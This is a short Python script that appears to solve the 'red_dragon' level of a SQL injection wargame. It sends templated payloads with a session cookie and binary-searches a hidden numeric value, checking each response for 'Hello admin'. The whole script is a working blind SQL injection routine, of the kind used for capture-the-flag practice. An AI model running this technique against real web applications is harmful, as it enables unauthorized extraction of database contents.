import string
import requests
import time

url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php/"
session = requests.Session()
char = string.printable
header = {
    'Cookie': "PHPSESSID=p9phs3kas3ep8ff1qv7q8mdo2a"
}
p = "id"
f1 = open("numeric.txt", "r")
list = []
num = 0
for ch in f1:
    print(num, ch)
    num = num + 1
    list.append(ch)
s_p = "no"
sp = "Hello admin"
start = 1
final = 1000000000000
step = 2

def binary_search(start , final):
    mid = (final + start) // 2
    print("Mid : " , mid)
    if final < start:
        return mid
    pw = list[0].replace("{pw}", s_p).replace("{i}", str(mid)).replace("\n", "").replace("{quote}", "<")
    get = session.get(url=url, headers=header, params=f"{p}={pw}")
    if sp in get.text:
        return binary_search(start , mid - 1)
    else:
        return binary_search(mid + 1 , final)



binary_search(0 , 10000000000000)